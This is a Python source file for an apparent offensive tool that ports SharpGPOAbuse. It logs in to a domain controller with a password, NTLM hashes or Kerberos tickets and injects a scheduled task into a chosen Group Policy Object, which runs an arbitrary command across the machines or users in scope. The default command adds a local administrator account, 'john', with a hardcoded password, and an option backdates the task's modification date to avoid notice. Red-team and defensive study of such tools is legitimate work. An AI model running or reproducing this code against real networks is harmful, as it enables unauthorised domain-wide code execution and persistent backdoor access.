"""
This tool is a partial python implementation of SharpGPOAbuse
https://github.com/FSecureLABS/SharpGPOAbuse
All credit goes to @pkb1s for his research, especially regarding gPCMachineExtensionNames

Also thanks to @airman604 for schtask_now.py that was used and modified in this project
https://github.com/airman604/schtask_now
"""

import argparse
import logging
import re
import sys
from impacket.smbconnection import SMBConnection
from impacket.examples.utils import parse_credentials
from pygpoabuse import logger
from pygpoabuse.gpo import GPO

parser = argparse.ArgumentParser(add_help=True, description="Add ScheduledTask to GPO")

parser.add_argument('target', action='store', help='domain/username[:password]')
parser.add_argument('-gpo-id', action='store', metavar='GPO_ID', help='GPO to update ')
parser.add_argument('-user', action='store_true', help='Set user GPO (Default: False, Computer GPO)')
parser.add_argument('-taskname', action='store', help='Taskname to create. (Default: TASK_<random>)')
parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
parser.add_argument('-description', action='store', help='Task description (Default: Empty)')
parser.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
parser.add_argument('-command', action='store',
                    help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
parser.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file '
                                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                                        'cannot be found, it will use the ones specified in the command '
                                        'line')
parser.add_argument('-dc-ip', action='store', help='Domain controller IP or hostname')
parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')
parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
parser.add_argument('-FilterUser', action='count', default=0, help='Add user filter to GPO')
parser.add_argument('-FilterComputer', action='count', default=0, help='Add computer filter to GPO')
parser.add_argument('-Samaccount', action='store', help='Samaccount name from filter')
parser.add_argument('-SID', action='store', help='SID object')
parser.add_argument('-TV', action='store', default="1.4", help='Task version by default 1.4')
parser.add_argument('-file', type=str, help='File with Samaccoun:SID to add mor than one filter')

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()


if options.FilterComputer:
    if getattr(options, 'Samaccount', None) and getattr(options, 'SID', None):
        archivo = "NOT_NEEDING"

    elif options.file:
        try:
            archivo = open (options.file, "r")
            archivo.close()
        except:
            print("The input file doesn't exist")
            exit()
    else:
        print("You need add the computer's SID and samaccount which is going to apply the filters or a file with samaccount:SID")
        exit()
elif options.FilterUser:
    if getattr(options, 'Samaccount', None) and getattr(options, 'SID', None):
        archivo = "NOT_NEEDING"
    elif options.file:
        try:
            archivo = open (options.file, "r")
            archivo.close()
        except:
            print("The input file doesn't exist")
            exit()
    else:
        print("You need add the user's SID and samaccount who is going to apply filters or a file with samaccount:SID")
        exit()
else:
    user_sid="None"
    samaccount="None"

if not options.gpo_id:
    parser.print_help()
    sys.exit(1)

# Init the example's logger theme
logger.init()

if options.v == 1:
    logging.getLogger().setLevel(logging.INFO)
elif options.v >= 2:
    logging.getLogger().setLevel(logging.DEBUG)
else:
    logging.getLogger().setLevel(logging.ERROR)

domain, username, password = parse_credentials(options.target)

if options.dc_ip:
    dc_ip = options.dc_ip
else:
    dc_ip = domain

if domain == '':
    logging.critical('Domain should be specified!')
    sys.exit(1)

if password == '' and username != '' and options.hashes is None and options.k is False:
    from getpass import getpass
    password = getpass("Password:")
elif options.hashes is not None:
    if ":" not in options.hashes:
        logging.error("Wrong hash format. Expecting lm:nt")
        sys.exit(1)

if options.ldaps:
    protocol = 'ldaps'
else:
    protocol = 'ldap'

if options.k:
    if not options.ccache:
        logging.error('-ccache required (path of ccache file, must be in local directory)')
        sys.exit(1)
    url = '{}+kerberos-ccache://{}\\{}:{}@{}/?dc={}'.format(protocol, domain, username, options.ccache, dc_ip, dc_ip)
elif password != '':
    url = '{}+ntlm-password://{}\\{}:{}@{}'.format(protocol, domain, username, password, dc_ip)
    lmhash, nthash = "",""
else:
    url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
    lmhash, nthash = options.hashes.split(":")

try:
    smb_session = SMBConnection(dc_ip, dc_ip)
    if options.k:
        smb_session.kerberosLogin(user=username, password='', domain=domain, kdcHost=dc_ip)
    else:
        smb_session.login(username, password, domain, lmhash, nthash)
except Exception as e:
    logging.error("SMB connection error", exc_info=True)
    sys.exit(1)

try:
    if options.file:
        archivo = options.file
    else:
        archivo = "NOT_NEEDING"

    gpo = GPO(smb_session)
    task_name = gpo.update_scheduled_task(
        domain=domain,
        gpo_id=options.gpo_id,
        name=options.taskname,
        mod_date=options.mod_date,
        description=options.description,
        powershell=options.powershell,
        command=options.command,
        gpo_type="user" if options.user else "computer",
        filtercomputer=options.FilterComputer,
        filteruser=options.FilterUser,
        samaccount=options.Samaccount,
        user_sid=options.SID,
        task_version=options.TV,
        archivo=archivo,
        force=options.f
    )
    if task_name:
        if options.FilterUser or options.FilterComputer:
            if gpo.update_versions(url, domain, options.gpo_id, "user" if options.user else "computer", options.Samaccount, options.SID, options.TV, archivo):
                logging.info("Version updated")
            else:
                logging.error("Error while updating versions")
                sys.exit(1)
        else:
            if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer", samaccount="None", user_sid="None", task_version="1.3", archivo="NOT_NEEDING"):
                logging.info("Version updated")
            else:
                logging.error("Error while updating versions")
                sys.exit(1)
            logging.success("ScheduledTask {} created!".format(task_name))
except Exception as e:
    logging.error("An error occurred. Use -vv for more details", exc_info=True)

def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
    try:
        smb_session = SMBConnection(address, target_ip)
        smb_session.login(username, password, domain, lmhash, nthash)
        return smb_session
    except Exception as e:
        logging.error("Connection error")
        return False
